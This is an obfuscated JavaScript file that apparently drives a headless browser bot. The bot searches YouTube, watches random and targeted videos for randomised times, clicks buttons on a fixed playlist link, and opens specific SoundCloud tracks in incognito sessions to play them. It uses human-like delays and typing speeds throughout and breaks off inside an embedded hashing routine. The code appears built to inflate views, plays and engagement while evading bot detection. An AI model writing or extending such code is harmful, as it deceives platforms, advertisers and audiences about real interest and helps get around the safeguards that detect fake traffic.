function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x260f + 0x19dd + -0x1 * -0xc32);
    let h = e[f];
    if (b['MHGbfI'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x1807 + 0x12f7 + 0x157f * -0x2, s, t, u = 0x275 + 0x460 + -0x9f * 0xb; t = n['charAt'](u++); ~t && (s = r % (-0xe1 + -0x2156 * -0x1 + -0x37 * 0x97) ? s * (0x1a87 + -0x5 * -0x209 + -0x2474) + t : t, r++ % (0x1845 + 0x2 * -0x1073 + -0x8a5 * -0x1)) ? p += String['fromCharCode'](0x118 * 0x5 + 0xba7 + -0x10 * 0x102 & s >> (-(-0x894 + 0x1 * -0x1acd + -0x2363 * -0x1) * r & 0x8d9 + 0x167 * -0x5 + -0x1d0)) : -0x4a1 + 0x78a + -0x2e9 * 0x1) {
          t = o['indexOf'](t);
        }
        for (let v = -0x88b + 0x2 * 0xae7 + -0xd43, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x153 * -0xc + -0x12c5 + -0x1 * -0x22b9))['slice'](-(0x1e0 + 0x2dd * -0x2 + -0x34 * -0x13));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1302 + -0xb1d + -0x7e5,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0xc16 + 0x5c * -0x2c + 0x3ba; u < 0x1609 + 0x5d * -0x11 + 0x4 * -0x3b7; u++) {
          p[u] = u;
        }
        for (u = -0xe3 * 0x19 + -0xea0 + 0x1 * 0x24cb; u < -0x6fe + -0x1 * -0x25a3 + -0x1da5; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0xfd2 + -0x163 * 0x1a + 0x60 * 0x8d), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x105 * -0x1f + -0x100 * 0x15 + 0x349b * 0x1, q = -0x1eca + 0x73 * -0xd + 0x24a1;
        for (let v = 0x3 * -0x7f6 + 0x19b + 0x1 * 0x1647; v < n['length']; v++) {
          u = (u + (-0x214a + -0x1f64 * -0x1 + -0x1 * -0x1e7)) % (0x160c + -0x2363 + -0x1 * -0xe57), q = (q + p[u]) % (0x18a0 + -0x19 * -0x78 + -0x2358), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0xfb7 + -0x1 * 0x1603 + -0x2 * -0x135d)]);
        }
        return t;
      };
      b['zFvaNA'] = m, c = arguments, b['MHGbfI'] = !![];
    }
    const j = e[0x16f8 + -0x6 * 0x4db + -0x6 * -0x107],
      k = f + j,
      l = c[k];
    return !l ? (b['bZUdZs'] === undefined && (b['bZUdZs'] = !![]), h = b['zFvaNA'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const W = b,
  V = c,
  U = d;

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x260f + 0x19dd + -0x1 * -0xc32);
    let h = e[f];
    return h;
  }, d(b, c);
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0xe1 + -0x2156 * -0x1 + -0x43 * 0x7c))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x1a87 + -0x5 * -0x209 + -0x24b4), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x919c + 0x17 * -0x895 + -0x21cb * -0x5 + (0x20d * 0x8 + 0x22f4 + -0x2 * -0x39e) * random()) : await standardWaitForNetIdle(f), await wait(-0x894 + 0x1 * -0x1acd + -0x36e9 * -0x1 + (0x11b1 + 0x2ce * -0x5 + 0x2365) * random()), -0x4a1 + 0x78a + -0x2e8 * 0x1;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x88b + 0x2 * 0xae7 + 0x645), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x153 * -0xc + -0x12c5 + -0x6 * -0x5c7;
}
async function randomWait() {
  return await wait(0x1e0 + 0x2dd * -0x2 + -0x52 * -0x49 + (0x1302 + -0xb1d + 0xba3) * random()), 0xc16 + 0x5c * -0x2c + 0x3bb;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = d;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me'](R(0x8) + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1609 + 0x5d * -0x11 + 0x14 * -0xcb, -0xe3 * 0x19 + -0xea0 + 0x1 * 0x24d2), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x53ed + -0x1 * -0x1c39f + -0x8552) * getRandomInt(-0xfd2 + -0x163 * 0x1a + 0x3a * 0xe5, 0x105 * -0x1f + -0x100 * 0x15 + 0x1a50 * 0x2), h)), -0x1eca + 0x73 * -0xd + 0x24a2;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x3 * -0x7f6 + 0x19b + 0x1 * 0x1647;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x214a + -0x1f64 * -0x1 + -0x1 * -0x1e7]['split']('\x20');
    for (let k = 0x160c + -0x2363 + -0x5 * -0x2ab; k < i['length']; k += 0x18a0 + -0x19 * -0x78 + -0x2456)
      j += i[k] * h[i[k + (-0xfb7 + -0x1 * 0x1603 + -0xd * -0x2e7)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x16f8 + -0x6 * 0x4db + -0x18 * -0x42)['map'](l => Array['from'](l['children']))['flat'](-0x1 * 0x7b5 + 0x11f5 + -0xa3f)['map'](l => l['childNodes'][-0xf1a * 0x1 + 0xc95 + -0x11 * -0x26]['childNodes'][-0x26c8 + -0x13 * -0x1b9 + -0x60d * -0x1]['childNodes'][0x1d93 + -0x1a99 + -0x2f9]['childNodes'][-0x102f + 0x1c2 + 0x3 * 0x4cf]['childNodes'][-0xebd * 0x1 + -0x12ea + 0x21a8]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x1374 * 0x1 + -0x1451 + 0x2bad, -0x2 * 0xaf0 + -0x87d + 0x1 * 0x31e5)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x450b * -0x1 + -0x578b + 0xd72e);
  const h = await getMaxTime(f),
    i = Math['min']((0x3 * 0x1ddb + 0x1 * -0xa0f6 + -0x131c5 * -0x1) * getRandomInt(0x169f + -0x1e5 * -0x5 + -0x3 * 0xab2, 0x1 * -0x2528 + 0x9e * -0x3 + 0x67 * 0x61), h);
  return await wait(i), 0x206a + 0x33c * -0x9 + 0xd * -0x41;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x7 * 0x1cd + -0x201e + -0x3 * -0x681]['children'][0x13 * -0xab + -0x17db + -0x248c * -0x1]['children'][-0x1475 * -0x1 + 0xf19 * 0x1 + 0x25 * -0xf6]['children'][-0x18 * -0x16 + -0xa56 + 0x846]['children'][-0xed6 + 0x95 * 0x9 + 0x999]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1 * 0x24ca + 0x1fc * 0x8 + 0x14eb;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    const S = d;
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => S(0x11) === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0xdce + 0xb87 + -0x18f1 + (-0x1 * 0x92f + 0x11 * 0x10 + 0x851) * random()
  }), await wait(-0x10a8 + 0x4 * -0x54a + -0x27c4 * -0x1 + (-0x46f * 0x3 + -0xcaf + 0x1b28) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x1 * -0x1f0b + -0x1430 + 0x333d]['childNodes'][-0x1 * -0x1a53 + 0x138b + 0x3b * -0xc7]['childNodes'][-0x1b6b * 0x1 + 0x22c1 * -0x1 + 0x3e2d]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x11c6 + -0x25d4 + 0x1413]['childNodes'][0x8d * 0x2f + -0x25ed + 0x43 * 0x2e]['childNodes'][0x1400 + -0x1b4b + 0x74d]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x38 + -0x137b + 0x4ed * 0x4),
          r = 0xe6 * -0x1 + 0x2437 + -0x1 * 0x2351;
        for (let u = -0x1 * 0x1be3 + 0x2 * 0x20b + 0x17cd; u < q['length']; u += -0x64 * 0x2f + 0x4fd * -0x1 + 0x175b)
          r += q[u] * k[q[u + (-0x1b36 + -0x1692 * -0x1 + 0x4a5)]];
        return r;
      }(n);
  });
  await wait((-0x30fb + -0x53c * -0x13 + 0x81f) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x1bcb8 + -0x12ff4 + -0x14 * -0x3127) * getRandomInt(0x1b6f + 0x1f2d + 0x9 * -0x683, -0x259e + 0x1ee8 + 0x6c0), h + (-0x66e * -0x1 + 0x1 * -0x313 + 0x102d));
  return await wait(i), -0x156c + 0x3b0 * -0x8 + 0x32ed;
}
async function keyWatch(f) {
  const T = d;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x13e7 + 0x1 * -0x260b + 0x1224), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + T(0xd) + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x823 * -0x1 + 0x5 * 0x3fb + -0x4 * 0x3 + (0x1fa0 + -0x2 * -0x50d + -0x2 * 0x12e9) * Math['random']());
    });
  }, 0x3287 + 0x40 * 0xa2 + -0x3faf);
  await wait(-0x6272a + 0x6f226 + 0x1e472 * 0x2);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x5c * -0x26e + 0x1 * -0x11d01 + 0x127d9) * getRandomInt(-0x1 * -0x142f + 0x1 * -0x1a61 + -0x3 * -0x212, -0x2 * 0xe5a + -0x236b + 0x4038)), clearInterval(h), 0x3 * -0x9dc + -0x1b1e + -0x1 * -0x38b3;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x17 * -0x19d + 0xd12 + -0x322d;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x373 * -0x3 + -0x2 * 0x7eb + 0x57e;
    await randomWait();
  }
  return -0xee + 0x4 * 0x79c + -0x1 * 0x1d81;
}

function fetchRandomSC() {
  return Math['random']() <= -0x39a * 0x1 + 0x1727 + -0x138d + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x1f5f + -0x1637 + 0x4 * -0x24a + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x101 * -0x9 + 0xd3 * -0x26 + 0x1649 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0xe3 * 0x25 + 0x30b * 0x1 + -0x23da;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0xc965 + 0x199a * 0x1 + -0x3337 * 0x1 + getRandomInt(-0x1f46 + -0x291 * -0x1f + 0xa4f, -0x5 * 0x196a + -0x2 * -0x3d93 + 0x1 * 0x791c));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x29b * -0xd + -0x147 + 0x39f * -0x9), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0xe85 + -0x10 * 0x59 + 0x61 * 0x35;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1 * -0x2419 + 0x874 + 0x3f3 * 0x7, 0x1fa8 + 0x1 * -0x1dba + 0x2 * -0xde)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x1544 + -0x1009 + 0x1 * 0x2d1d + floor((0x1 * -0x1c3d + -0x40 * 0x44 + -0x3125 * -0x1) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xe9f64622 + 0x94ebc984 + -0x2e * -0x4a19e89),
          0x9271a0 + -0x4ffd1e + -0x6a * -0x94a3,
          -0x3 * 0x392f + -0x2e * 0x315 + -0x1b953 * -0x1,
          -0x7 * -0x261 + 0xc4 * 0x5 + -0x13fb
        ], y = [
          0x413 * 0x7 + 0xa * -0x254 + -0x1b7 * 0x3,
          -0x2517 + 0x128e + 0x1299,
          -0x1961 + 0x52 + 0x1917,
          0x1 * 0xe75 + 0x117e * 0x1 + 0x1ff3 * -0x1
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x123a + -0x1 * 0x20a1 + 0x32dc)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x222f + 0x49 + -0x2278; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x24f1 + -0x10bd + 0x1 * 0x35ae) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0xe07 + -0x1d80 + 0x3f5 * 0xb] = A[0xa03 + 0x2 * 0x769 + -0x18c5] = A[0xf2e * -0x1 + 0x6f * 0x7 + 0xc26] = A[0x1a * 0x13a + -0x26c9 * -0x1 + -0x46ab] = A[0x7e2 + 0x10c9 * -0x1 + -0x8ea * -0x1] = A[0x15 * -0x161 + 0x165 * -0x11 + 0x16 * 0x265] = A[-0xa7a * 0x3 + -0x26d3 * -0x1 + -0x760] = A[-0x2037 + -0x149b + -0x4 * -0xd36] = A[-0x36 * -0x49 + -0x2 * -0x100c + 0x2f77 * -0x1] = A[0x2033 + 0x1c * -0x67 + -0x14e7] = A[-0x562 * 0x7 + 0xbfd + 0x19ba] = A[0x167c + -0x2 * 0x9c9 + 0x10 * -0x2e] = A[0x72 * 0x3 + 0x15da + -0x1725] = A[-0x22a4 + -0x1 * -0x208e + 0x2a * 0xd] = A[-0x1b * -0xac + -0xad7 + -0x740] = A[0x1 * -0x257c + -0x15aa + 0x3b34] = A[0x1b * 0x51 + 0x34 * 0xb3 + -0x52 * 0x8c] = -0x8 * -0x469 + -0x258 * -0x5 + -0x2f00, this['blocks'] = A) : this['blocks'] = [
                0x150a + 0xa76 + -0x1f80,
                0xccc + 0x5e9 + 0x12b5 * -0x1,
                0x25e7 + -0x2131 + 0x192 * -0x3,
                -0xb09 + -0x64 * 0x54 + 0x2bd9,
                0x24bf + -0x1eaf + 0x2 * -0x308,
                -0x817 + -0x1e15 + 0x262c,
                -0x1d * -0x31 + 0x2f * 0x5c + -0x1671,
                -0x28f * -0x1 + -0xb * 0x1a5 + -0x11c * -0xe,
                -0x270d + -0x1f * -0x12f + -0x1 * -0x25c,
                -0x1 * 0x13e1 + -0x2449 + 0x1 * 0x382a,
                -0x83 * -0x17 + -0x4 * -0x283 + 0x5 * -0x45d,
                -0x175 * -0x11 + -0x1e14 + 0x54f * 0x1,
                0x2 * 0x259 + -0x1 * -0xb1f + 0xfd1 * -0x1,
                -0xfc7 + -0x265 * 0x2 + 0x1491,
                0x130 * -0x1d + 0xb88 + 0x16e8,
                -0xb9 * -0x1e + 0x1 * -0x183b + 0x28d,
                0x1329 + 0x6e2 * -0x1 + -0x7 * 0x1c1
              ], this['h0'] = -0xc14d5fbe + 0x39bfe360 + 0xeed29f5f, this['h1'] = -0x12784840c + -0x166 * -0x141e86d + 0x55272727, this['h2'] = -0xbd335865 + 0xddb444a1 + -0x542 * -0x16ddc1, this['h3'] = 0xfa814c5 + 0xaee58e + -0x24a5dd, this['h4'] = -0x21 * -0xa427c47 + -0x6367c563 + -0xfc4 * 0x2bfc5, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1fe3 + -0xb * -0x271 + 0x3abe * -0x1, this['finalized'] = this['hashed'] = -0x22f1 + 0x71a + 0x1bd7, this['first'] = 0x1a9d + 0x56b + -0x3 * 0xaad;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1 * 0x1e84 + -0x1 * -0x20de + -0x3f62, O = J['length'] || -0x17 * -0x10d + -0x6dc + -0x114f * 0x1, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1a0c + 0x5de + -0x1fea * 0x1, P[-0x21 * 0x2f + -0x1c32 + 0x2241] = this['block'], P[-0x16 * 0x5e + -0x39 * -0x35 + 0x1 * -0x3a9] = P[0x14e * -0x4 + 0x1f * -0xb2 + 0x1ac7] = P[-0x16b * -0x1a + -0x2111 * -0x1 + -0x45ed] = P[-0x45 * 0x35 + 0x11 * 0x1d2 + -0x10a6] = P[-0x1 * -0x1d23 + 0xd9a * -0x1 + -0xf85 * 0x1] = P[-0x3 * -0x1e0 + 0x8c * -0xb + 0x1 * 0x69] = P[-0x25 * 0x3e + 0x1 * -0x2524 + 0x2e20] = P[0x94d * -0x1 + -0x123 * -0x13 + -0xc45] = P[-0x42d * -0x7 + 0x2078 + -0x3dab] = P[0x1 * -0xbef + -0x14e7 + -0x63 * -0x55] = P[0x1027 + 0xb * 0x11 + -0xe * 0x134] = P[-0x1 * -0x1472 + -0xa6 + 0x1 * -0x13c1] = P[0x1bf * -0x9 + 0x1728 + -0x765] = P[-0x1 * 0xa13 + 0x228 + 0x7f8] = P[-0x1 * -0x14e3 + -0x1 * 0x1874 + 0x39f] = P[-0x1ec1 + -0x2546 + 0x4416] = -0x4cc + 0x16f3 + -0x1227), K) {
                    for (N = this['start']; M < O && N < -0x2060 + -0x2307 + 0x43a7; ++M)
                      P[N >> -0xad9 * 0x3 + 0x2708 + -0x67b] |= J[M] << y[0xaa7 + -0x3 * 0x48e + -0x2b * -0x12 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x13 * 0xe9 + 0x1b96 + -0xa0b; ++M)
                      (L = J['charCodeAt'](M)) < -0x5bb * -0x3 + 0x5ea + -0x169b ? P[N >> 0x2 * -0x972 + -0x1c * 0x1f + 0x164a] |= L << y[0x1495 + 0x661 + -0x1af3 * 0x1 & N++] : L < 0x3 * 0x301 + -0x71 * -0x17 + -0xb2a ? (P[N >> 0xd * 0x11 + 0xeb1 * -0x1 + 0xdd6] |= (-0x222b + 0x1 * 0xb53 + 0x1 * 0x1798 | L >> 0xaf9 * 0x2 + 0x1 * -0x525 + -0x10c7) << y[0x10ef + -0xd9b + -0x11b * 0x3 & N++], P[N >> -0xd * -0x167 + -0xeac + -0x38d] |= (-0x7d5 + 0x926 + -0xd1 | -0x1c53 + 0x4d7 * 0x7 + 0x54f * -0x1 & L) << y[0x4df * 0x8 + -0x109 + -0x12f6 * 0x2 & N++]) : L < -0x4 * -0x3095 + 0x37de + -0x2232 || L >= -0xe9d5 + -0x4ea8 + -0x1 * -0x2187d ? (P[N >> -0xe5b + 0x1979 * -0x1 + 0x27d6] |= (-0x9b + 0x2dd * 0x5 + -0xcd6 | L >> -0x17d9 + -0x6be * -0x5 + -0x9d1) << y[-0x14de + 0x1bca * 0x1 + 0x1d * -0x3d & N++], P[N >> -0x1756 + 0x1 * 0x1807 + -0xaf] |= (-0xf6d + -0xef * 0x17 + 0x2566 | L >> -0x2 * 0x115 + -0x29 * 0x8 + 0x378 & -0x20a9 + -0x3 * 0x13 + 0x2121 * 0x1) << y[0x1d * 0x5b + -0x75c + -0x4 * 0xbc & N++], P[N >> -0x3 * -0x3cd + 0x5cb * 0x2 + -0x16fb] |= (0x816 + 0x2615 * 0x1 + -0x2dab | 0x2336 + -0x233e * -0x1 + -0x4635 & L) << y[0x1140 * 0x1 + 0xc20 + -0x1 * 0x1d5d & N++]) : (L = 0x3856 * 0x3 + -0x9879 + -0x15c5 * -0xb + ((0x1d35 * -0x1 + 0xe * -0x1d5 + 0x1d6d * 0x2 & L) << -0x1 * 0x1b51 + -0x1fec + 0x3b47 | 0x8 * -0x58 + -0x1 * 0x14c6 + 0x1b85 * 0x1 & J['charCodeAt'](++M)), P[N >> 0xc89 + 0x6b9 + 0x134 * -0x10] |= (0x21d * -0x2 + -0x689 + 0xbb3 | L >> -0x1705 * 0x1 + -0x7a9 * 0x5 + 0x3d64) << y[-0x1 * 0xf96 + -0x2596 + 0x352f & N++], P[N >> 0x2 * -0xae7 + -0x116f * -0x1 + 0x461] |= (0xf55 + -0xb17 * -0x1 + -0x19ec | L >> 0x13fa + -0x2500 + 0x1112 & -0xdee + 0x661 + 0x7cc) << y[0x4b2 * 0x6 + -0x1d5 * 0x1 + 0x151 * -0x14 & N++], P[N >> 0x55a + 0xc * -0x1ea + 0xbc * 0x18] |= (-0x98e + 0x1e91 + -0x1 * 0x1483 | L >> -0xfdb + -0x1 * -0x151d + -0x86 * 0xa & -0x133 * 0xb + 0xcea + 0x86) << y[0x1 * 0x22b2 + -0x14 * 0x1ac + -0x13f & N++], P[N >> -0xdf4 + 0xdde + 0x6 * 0x4] |= (-0x806 * -0x2 + -0xa0a + 0xf * -0x5e | 0x6bd + 0x493 + -0xb11 & L) << y[0x301 * -0x7 + -0x1f3 * 0x1 + 0x16fd & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x1 * -0xfed + 0x3 * 0x6a0 + -0x3b3 ? (this['block'] = P[0xc * 0x26a + 0xdd + -0x1dc5], this['start'] = N - (0x1eb * 0x9 + 0xfcb + -0x20ce), this['hash'](), this['hashed'] = 0x343 * -0x3 + -0x2267 + 0x2c31) : this['start'] = N;
                }
                return this['bytes'] > -0x26d5 * 0x7646b + 0x1272d5773 + 0xd893 * 0x12501 && (this['hBytes'] += this['bytes'] / (0xa814 * 0x264a6 + -0x1e0a1fe08 + 0x14e653110) << 0x865 + 0x1617 + -0x1e7c, this['bytes'] = this['bytes'] % (0x1dd3985e0 + 0x19a4 * -0x2bef2 + -0x1 * 0x96d190d8)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x23 * -0x95 + 0x1 * 0xe75 + 0x5eb;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
